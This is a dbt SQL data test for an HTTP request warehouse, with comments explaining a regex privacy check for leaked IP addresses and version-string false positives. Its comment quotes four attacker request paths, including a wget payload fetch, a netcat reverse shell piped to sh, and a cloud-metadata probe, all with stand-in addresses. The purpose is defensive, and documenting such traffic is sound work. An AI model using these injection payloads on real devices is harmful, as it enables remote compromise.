-- The privacy guarantee, enforced in the warehouse rather than trusted.
--
-- Python drops the address at the boundary, and the pytest suite asserts that. This
-- is the second line: if a future column, a schema change or a hand-loaded partition
-- ever reintroduces a bare address into the fact table, the build fails here.
--
-- `client_network` is excluded because it is a truncated network by design, and
-- `request_host` because the Host header legitimately contains addresses -- scanners
-- send them, and that is a fact worth keeping rather than laundering.
--
-- `path` is excluded for exactly the same reason, added 30 Aug 2026 when a backfill of
-- thirty older days turned up five of them. Every one was an address the *attacker*
-- typed, not a visitor the pipeline failed to hash:
--
--     /cgibin/mainfunction.cgi&...keyPath=wget+http://203.0.113.10/...memory_load.mips
--     /`echo${IFS}a|nc${IFS}203.0.113.11${IFS}1489|sh`
--     /bin/zhttpd/;ping${IFS}-c${IFS}6${IFS}203.0.113.12;
--     @<cloud-metadata-address>/latest/meta-data/instance-id
--
-- A DrayTek command injection pulling a MIPS payload, a netcat reverse shell, and two
-- probes at the cloud metadata address. These name malware infrastructure. Laundering
-- them out of the *table* would destroy the most interesting rows in it to protect
-- nobody -- so the table keeps them and this comment does not. The addresses above are
-- RFC 5737 documentation stand-ins: the repository guard in
-- tests/test_no_real_addresses_in_fixtures.py forbids a real one in tracked files, and
-- it is right to, because "it is only an attacker" is exactly the kind of exception
-- that erodes a rule. The shape of the payload is what this comment is for.
--
-- The distinction that matters is not "is this an address" but "did this pipeline
-- derive it from a person". `path` and `request_host` are verbatim client input:
-- nothing here writes an address into them, and an address that appears was sent by
-- the caller. `client_hash` below is the opposite -- it is ours, and it is checked
-- strictly, because that is the column a privacy fault would actually show up in.
--
-- `user_agent` stays checked. It is client input too, but it is the column where a
-- misrouted header would land as "X-Real-IP: 203.0.113.4", and the version-string
-- false positives there are already understood.
--
-- Version strings are the false positive to defeat, and this rule has now been wrong
-- twice, in the same way both times.
--
-- First it carried a hard-coded list of product names, and failed on real traffic the
-- moment a product outside the list appeared ("WhatsApp/10.0.2.1"). That was replaced
-- with a structural rule: a token immediately preceded by "/" is a version. Which
-- then failed on
--
--     Mozilla/5.0 (X11; Linux x86_64; rv:1.9.5.20) Gecko/ Firefox/9.0
--
-- because Gecko introduces its version with "rv:" and not with a slash. Both times
-- the vocabulary came from the sample in front of me rather than from the format.
--
-- So: "/" or ":" immediately before the token means a version. A leaked address is
-- not written that way -- a header value that reached the wrong column arrives as
-- "X-Real-IP: 203.0.113.4", with a space, and is still caught. Nothing
-- numeric distinguishes 1.9.5.20 from an address, so position is the only signal there is.
--
-- RE2, which DuckDB uses, has no lookbehind, so the preceding character is matched
-- explicitly -- it must not be a slash, a colon, a digit or a dot, the last two
-- preventing a match on the tail of a longer version string.
--
-- The pytest guard over the repository deliberately does NOT allow ":" here. It
-- defends against a different thing: a human pasting a production log line into a
-- file, where "X-Real-IP:203.0.113.200" is exactly the shape to catch. This test's
-- input is machine-generated client text that is full of legitimate versions.

{% set address = '(^|[^/:0-9.])(\d{1,3}\.){3}\d{1,3}(\D|$)' %}

select
    'user_agent' as column_name, user_agent as offending_value, count(*) as occurrences
from {{ ref('fct_http_request') }}
where regexp_matches(user_agent, '{{ address }}')
group by 1, 2

union all

-- A hash that is not 128 bits of hex did not come from the privacy boundary.
select
    'client_hash', client_hash, count(*)
from {{ ref('fct_http_request') }}
where client_hash is not null
  and not regexp_matches(client_hash, '^[0-9a-f]{32}$')
group by 1, 2
